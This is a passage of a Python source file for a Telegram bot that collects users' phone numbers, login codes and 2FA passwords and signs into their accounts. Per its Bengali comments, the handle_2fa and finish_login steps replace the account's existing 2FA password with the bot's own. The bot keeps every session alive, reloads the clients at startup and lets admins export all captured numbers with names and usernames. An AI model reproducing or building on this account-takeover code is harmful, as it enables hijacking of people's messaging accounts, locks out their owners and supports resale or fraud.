        await update.message.reply_text(t(uid, "need_2fa"), parse_mode="Markdown")
        return WAITING_2FA
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        await client.disconnect()
        del pending[chat_id]
        return ConversationHandler.END

    # 2FA ছিল না → বট নতুন করে সেট করবে
    await finish_login(update, data, phone, uid, client, current_2fa_password=None)
    del pending[chat_id]
    return ConversationHandler.END

async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    if chat_id not in pending:
        await update.message.reply_text(t(uid, "session_expired"))
        return ConversationHandler.END

    data = pending[chat_id]
    password = update.message.text.strip()
    phone = data["phone"]
    client = data["client"]

    try:
        await client.sign_in(password=password)
    except PasswordHashInvalidError:
        await update.message.reply_text(t(uid, "invalid_2fa"))
        return WAITING_2FA
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        await client.disconnect()
        del pending[chat_id]
        return ConversationHandler.END

    # আগের 2FA দিয়ে লগইন → বটের 2FA তে বদলে দেবে
    await finish_login(update, data, phone, uid, client, current_2fa_password=password)
    del pending[chat_id]
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text(t(uid, "cancelled"))
    return ConversationHandler.END

# ====================== INFORMATION ======================
async def information(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if is_blocked(uid):
        await update.message.reply_text(t(uid, "blocked"), parse_mode="Markdown")
        return
    wait = await update.message.reply_text("🔄 Checking...")
    await prune_dead_accounts(uid)
    try:
        await wait.delete()
    except:
        pass
    accounts = load_json(ACCOUNTS_FILE, {})
    total = sum(1 for i in accounts.values() if i.get("uid") == uid)
    kb = [
        [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
        [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
    ]
    await update.message.reply_text(
        t(uid, "info_menu", total=total),
        reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown"
    )

async def info_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if is_blocked(uid):
        await q.edit_message_text(t(uid, "blocked"), parse_mode="Markdown")
        return
    await prune_dead_accounts(uid)
    data = q.data
    accounts = load_json(ACCOUNTS_FILE, {})
    user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}

    if data == "info_allnum":
        if not user_accs:
            await q.edit_message_text(t(uid, "no_numbers"))
            return
        country_count = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            country_count[c] = country_count.get(c, 0) + 1
        kb = [[InlineKeyboardButton(f"{get_flag('+' + c)} {get_country_name(c)} ({n})", callback_data=f"show_{c}")]
              for c, n in sorted(country_count.items(), key=lambda x: -x[1])]
        kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])
        await q.edit_message_text(t(uid, "your_numbers"), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("show_"):
        code = data.replace("show_", "")
        nums = [p for p, i in user_accs.items() if (i.get("country") == code or get_country_code(p) == code)]
        text = f"{get_flag('+' + code)} **{get_country_name(code)}** — `{len(nums)}`\n\n" + "\n".join(f"`{p}`" for p in nums)
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="info_allnum")]]), parse_mode="Markdown")

    elif data == "info_download":
        if not user_accs:
            await q.edit_message_text(t(uid, "no_download"))
            return
        country_count = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            country_count[c] = country_count.get(c, 0) + 1
        kb = [[InlineKeyboardButton("🌍 All Country", callback_data="dl_all")]]
        kb += [[InlineKeyboardButton(f"{get_flag('+' + c)} {get_country_name(c)} ({n})", callback_data=f"dl_{c}")]
               for c, n in sorted(country_count.items(), key=lambda x: -x[1])]
        kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])
        await q.edit_message_text(t(uid, "select_download"), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("dl_"):
        code = data.replace("dl_", "")
        user = q.from_user
        lines = [f"Name: {user.first_name or 'Unknown'}", f"Username: @{user.username or 'None'}",
                 f"Chat ID: {uid}", f"Total: {len(user_accs)}", ""]
        country_nums = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            if code != "all" and c != code:
                continue
            country_nums.setdefault(c, []).append(p)
        for c, nums in country_nums.items():
            lines.append(f"{get_country_name(c)} Total: {len(nums)}")
            lines.extend(nums)
            lines.append("")
        path = f"{DATA_DIR}/user_{uid}_{code}.txt"
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        await q.message.reply_document(open(path, "rb"), filename=f"numbers_{code}.txt")
        await q.edit_message_text(t(uid, "file_sent"))

    elif data == "info_back":
        total = len(user_accs)
        kb = [
            [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
            [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
        ]
        await q.edit_message_text(t(uid, "info_menu", total=total), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

# ====================== DASHBOARD (তোমার চাওয়া ফরম্যাট) ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    users = load_json(USERS_FILE, {})
    blocked = get_blocked()
    settings = get_settings()
    silent_on = settings.get("silent", True)
    notify_on = settings.get("user_code_notify", True)
    silent = "🟢 ON" if silent_on else "🔴 OFF"
    user_notify = "🟢 ON" if notify_on else "🔴 OFF"

    text = (
        f"👨‍💻 **Admin Dashboard**\n\n"
        f"👥 Total Users: `{len(users)}`\n"
        f"🔢 Total Active Numbers: `{len(accounts)}`\n"
        f"🚫 Blocked Users: `{len(blocked)}`\n"
        f"🌍 Countries Mapped: `{len(COUNTRY_DATA)}`\n"
        f"🔔 Silent Mode: {silent}\n"
        f"📨 User Code Notify: {user_notify}\n"
        f"🟢 Online Clients: `{len(clients)}`"
    )
    kb = [
        [InlineKeyboardButton("📢 BoardChat", callback_data="adm_bc")],
        [InlineKeyboardButton(f"🔔 Silent: {silent}", callback_data="adm_silent")],
        [InlineKeyboardButton(f"📨 User Code: {user_notify}", callback_data="adm_usernotify")],
        [
            InlineKeyboardButton("🚫 Block User", callback_data="adm_block"),
            InlineKeyboardButton("✅ Unblock User", callback_data="adm_unblock")
        ],
        [InlineKeyboardButton("📋 Blocked List", callback_data="adm_blocklist")],
        [InlineKeyboardButton("📁 Download All Users File", callback_data="adm_allfile")],
        [InlineKeyboardButton("🔄 Reload Clients", callback_data="adm_reload")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    data = q.data

    if data == "adm_bc":
        context.user_data["action"] = "broadcast"
        await q.edit_message_text("📢 Send message (sent as-is):")
    elif data == "adm_silent":
        s = get_settings()
        s["silent"] = not s.get("silent", True)
        save_json(SETTINGS_FILE, s)
        await q.edit_message_text(f"🔔 Silent Mode is now **{'ON 🟢' if s['silent'] else 'OFF 🔴'}**")
    elif data == "adm_usernotify":
        s = get_settings()
        s["user_code_notify"] = not s.get("user_code_notify", True)
        save_json(SETTINGS_FILE, s)
        await q.edit_message_text(f"📨 User Code Notify is now **{'ON 🟢' if s['user_code_notify'] else 'OFF 🔴'}**")
    elif data == "adm_block":
        context.user_data["action"] = "block"
        await q.edit_message_text("🚫 **Block User**\n\nSend Chat ID or `b 123456789`", parse_mode="Markdown")
    elif data == "adm_unblock":
        context.user_data["action"] = "unblock"
        await q.edit_message_text("✅ **Unblock User**\n\nSend Chat ID or `u 123456789`", parse_mode="Markdown")
    elif data == "adm_blocklist":
        blocked = get_blocked()
        if not blocked:
            await q.edit_message_text("📋 No blocked users.")
            return
        users = load_json(USERS_FILE, {})
        text = f"📋 **Blocked Users ({len(blocked)})**\n\n"
        for u in blocked[:50]:
            text += f"• `{u}` — {users.get(str(u), {}).get('name', '?')}\n"
        await q.edit_message_text(text, parse_mode="Markdown")
    elif data == "adm_allfile":
        await prune_dead_accounts()
        accounts = load_json(ACCOUNTS_FILE, {})
        users_data = {}
        for p, i in accounts.items():
            uid = i.get("uid")
            if not uid:
                continue
            users_data.setdefault(uid, {"name": i.get("name", ""), "username": i.get("username", ""), "numbers": []})
            users_data[uid]["numbers"].append(p)
        lines = []
        for uid, info in users_data.items():
            lines += [f"Name: {info['name']}", f"Username: @{info['username'] or 'None'}", f"Chat ID: {uid}", f"Total: {len(info['numbers'])}"]
            cn = {}
            for p in info["numbers"]:
                cn.setdefault(get_country_code(p), []).append(p)
            for c, nums in cn.items():
                lines.append(f"{get_country_name(c)} Total: {len(nums)}")
                lines.extend(nums)
            lines.append("\n" + "─" * 30 + "\n")
        path = f"{DATA_DIR}/all_users.txt"
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        await q.message.reply_document(open(path, "rb"), filename="all_users.txt")
        await q.edit_message_text("✅ File sent!")
    elif data == "adm_reload":
        n = 0
        for p in load_json(ACCOUNTS_FILE, {}):
            try:
                if await start_client(p):
                    n += 1
            except:
                pass
        await q.edit_message_text(f"✅ Reloaded `{n}` clients")

async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    text = update.message.text.strip()
    low = text.lower()

    if low.startswith("b ") or (len(low) > 1 and low[0] == "b" and low[1:].strip().isdigit()):
        try:
            uid = int(text[1:].strip())
            if is_admin(uid):
                await update.message.reply_text("❌ Cannot block an admin.")
                return
            msg = f"🚫 User `{uid}` **blocked**." if block_user(uid) else f"⚠️ Already blocked: `{uid}`"
            await update.message.reply_text(msg, parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ Use: `b 7935823047`", parse_mode="Markdown")
        return

    if low.startswith("u ") or (len(low) > 1 and low[0] == "u" and low[1:].strip().isdigit()):
        try:
            uid = int(text[1:].strip())
            msg = f"✅ User `{uid}` **unblocked**." if unblock_user(uid) else f"⚠️ Not blocked: `{uid}`"
            await update.message.reply_text(msg, parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ Use: `u 7935823047`", parse_mode="Markdown")
        return

    if "action" not in context.user_data:
        return
    action = context.user_data.pop("action")

    if action == "broadcast":
        users = load_json(USERS_FILE, {})
        ids = [int(u) for u in users if str(u).isdigit() and not is_blocked(int(u))]
        ok = 0
        st = await update.message.reply_text(f"📢 Sending to {len(ids)} users...")
        for u in ids:
            try:
                await context.bot.send_message(u, text, parse_mode="Markdown")
                ok += 1
            except:
                pass
        await st.edit_text(f"✅ Sent to `{ok}` / `{len(ids)}` users")
    elif action == "block":
        try:
            uid = int(text)
            if is_admin(uid):
                await update.message.reply_text("❌ Cannot block an admin.")
                return
            msg = f"🚫 User `{uid}` **blocked**." if block_user(uid) else f"⚠️ Already blocked: `{uid}`"
            await update.message.reply_text(msg, parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ Invalid ID")
    elif action == "unblock":
        try:
            uid = int(text)
            msg = f"✅ User `{uid}` **unblocked**." if unblock_user(uid) else f"⚠️ Not blocked: `{uid}`"
            await update.message.reply_text(msg, parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ Invalid ID")

async def post_init(app):
    print("🔄 Loading sessions...")
    for p in load_json(ACCOUNTS_FILE, {}):
        try:
            await start_client(p)
        except:
            pass
    await prune_dead_accounts()
    print(f"✅ Ready | {len(clients)} clients | {len(COUNTRY_DATA)} countries")
    asyncio.create_task(check_sessions_loop())

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    conv = ConversationHandler(
        entry_points=[
            MessageHandler(
                filters.Regex(r'^\+?\d{8,15}$'),
                handle_phone
            )
        ],
        states={
            WAITING_CODE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    handle_code
                )
            ],
            WAITING_2FA: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    handle_2fa
                )
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
        allow_reentry=True
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("language", language_cmd))
    app.add_handler(CommandHandler("information", information))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            admin_text
        ),
        group=0
    )

    app.add_handler(conv, group=1)

    app.add_handler(
        CallbackQueryHandler(
            lang_cb,
            pattern=r"^lang_"
        )
    )

    app.add_handler(
        CallbackQueryHandler(
            info_cb,
            pattern=r"^(info_|show_|dl_)"
        )
    )

    app.add_handler(
        CallbackQueryHandler(
            admin_cb,
            pattern=r"^adm_"
        )
    )

    print("🚀 Bot starting...")
    app.run_polling()


if __name__ == "__main__":
    main()
